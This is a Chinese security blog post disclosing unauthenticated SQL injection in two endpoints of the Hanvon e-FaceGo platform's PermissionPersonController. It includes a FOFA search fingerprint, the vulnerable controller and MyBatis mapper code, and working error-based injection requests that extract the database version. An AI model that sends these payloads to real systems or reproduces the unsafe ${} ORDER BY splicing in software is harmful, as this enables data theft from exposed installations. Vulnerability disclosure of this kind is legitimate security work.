---
title: "汉王e脸通综合管理平台 PermissionPersonController 多个SQL注入漏洞"
source: https://mrxn.net/jswz/hanvon-efacego-accessPermissionPerson-sqli.html
asset_dir: assets/汉王e脸通综合管理平台-permissionpersoncontroller-多个sql注入漏洞
---

# 汉王e脸通综合管理平台 PermissionPersonController 多个SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/7/22 08:23
- 893浏览
- [0评论](#comment)
- 32分钟阅读

深入探索

计算机安全

鉴权

身份验证

---

# 漏洞简介

汉王e脸通综合管理平台的 PermissionPersonController 接口多个方法存在 [SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。攻击者可在无需认证的情况下，通过构造恶意请求参数注入恶意 SQL 语句，导致数据库信息泄露、数据篡改甚至系统权限提升，影响系统数据安全和完整性。

SQL注入防护

# 影响版本

v1.6.x

# fofa语法

> icon\_hash="1380907357"

# 漏洞分析

深入探索

技术文章订阅

文本剥离工具

网络安全课程

## queryDoorsByUserId

直接看 `PermissionPersonController` 里关于 `queryDoorsByUserId` 的实现

```
@RequestMapping(
        value = {"queryDoorsByUserId.do"},
        method = {RequestMethod.GET}
    )
    @ResponseBody
    public RequestJson queryDoorsByUserId(@RequestParam(required = false) Integer page, @RequestParam(required = false) Integer pageSize, @RequestParam(required = false) Integer employeeId, @RequestParam(required = false) String doorName, @RequestParam(required = false) String order, @RequestParam(required = false) String columnKey) {
        RequestJson result = new RequestJson();
        ControlInfoParam record = new ControlInfoParam();

        try {
            if (page == null) {
                page = Constants.DEFAULT_START_PAGE_INDEX;
            }

            if (pageSize == null) {
                pageSize = Constants.PAGE_SIZE;
            }

            record.setColumnKey(columnKey);
            record.setOrder(order);
            record.setEmployeeId(employeeId == null ? 0 : employeeId);
            record.setDoorName(doorName);
            PageHelper.startPage(page, pageSize);
            List<DoorInfoVO> doorInfoVOS = this.accessPermissionService.queryDoorsByUserId(record);
            PageInfo<DoorInfoVO> info = new PageInfo(doorInfoVOS);
```

深入探索

物流软件安全

安全工具开发

文件大小转换

和 汉王e脸通综合管理平台 queryDoorInfoList.do SQL注入漏洞 处理逻辑差不多，直接看对应的 mapper xml文件 AccessPermissionInfoDao.xml

代码安全审计

```
<select id="queryDoorsByUserId" resultType="com.hanvon.iface.tpm.access.DoorInfoVO">
        SELECT adi.id id,adi.name name,d.sz_name controlName
        FROM `access_door_info` adi
        INNER JOIN  `dev_device` d ON d.ng_id = adi.DEVICE_CONTROL_ID
        INNER JOIN `access_permission_door` apd ON apd.`DOOR_ID` = adi.id
        INNER JOIN `access_permission_employee` ape ON ape.`PERMISSION_ID` = apd.`PERMISSION_ID`
        WHERE 1=1
        <if test="record.employeeId!=null">
            AND ape.EMPLOYEE_ID = #{record.employeeId}
        </if>
        <if test="record.doorName!=null">
            AND adi.NAME LIKE CONCAT('%',#{record.doorName}, '%')
        </if>
        GROUP BY adi.id
        <if test="record.order != null and record.order != '' and record.columnKey!=null">
        ORDER BY ${record.columnKey} ${record.order}
        </if>
    </select>
```

用户可控的 `columnKey` 和 `order` 参数未经任何过滤直接拼接到 SQL 语句的 `ORDER BY` 子句中，导致攻击者可构造恶意输入执行任意 SQL 命令，造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

## queryUsersByDoorId

[![汉王e脸通综合管理平台 PermissionPersonController 多个SQL注入漏洞](images/img-001-53f06269673f.webp)](https://image.mrxn.net/a2d6316b08e84c849dc903be92257e9c.webp)

[![汉王e脸通综合管理平台 PermissionPersonController 多个SQL注入漏洞](images/img-002-b931958bcdc6.webp)](https://image.mrxn.net/d516a13c071c417d8953ec898c2884c8.webp)

# 漏洞复现

## queryDoorsByUserId

```
GET /manage/accessPermissionPerson/queryDoorsByUserId.do?recoToken=67mds2pxXQb&page=1&pageSize=10&columnKey=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(123=123,1)))),8357))&order=DESC HTTP/1.1
Host: hanvon.mrxn.net
```

[![汉王e脸通综合管理平台 PermissionPersonController 多个SQL注入漏洞](images/img-003-f87235437f95.webp)](https://image.mrxn.net/39a4215af71c4dce85cbeb8ff3ba9112.webp)

利用报错注入获取数据版本号

漏洞扫描服务

## queryUsersByDoorId

```
GET /manage/accessPermissionPerson/queryUsersByDoorId.do?recoToken=67mds2pxXQb&page=1&pageSize=10&columnKey=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(123=123,1)))),8357))&order=DESC HTTP/1.1
Host: hanvon.mrxn.net
```

[![汉王e脸通综合管理平台 PermissionPersonController 多个SQL注入漏洞](images/img-004-23d7c1eda07d.webp)](https://image.mrxn.net/654e98edbe0b4e0c982063e8411ece95.webp)

利用报错注入获取数据版本号

网络安全

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [4.1.queryDoorsByUserId](#toc-4-1-)
- [4.2.queryUsersByDoorId](#toc-4-2-)
- [5.漏洞复现](#toc-5-)
- [5.1.queryDoorsByUserId](#toc-5-1-)
- [5.2.queryUsersByDoorId](#toc-5-2-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
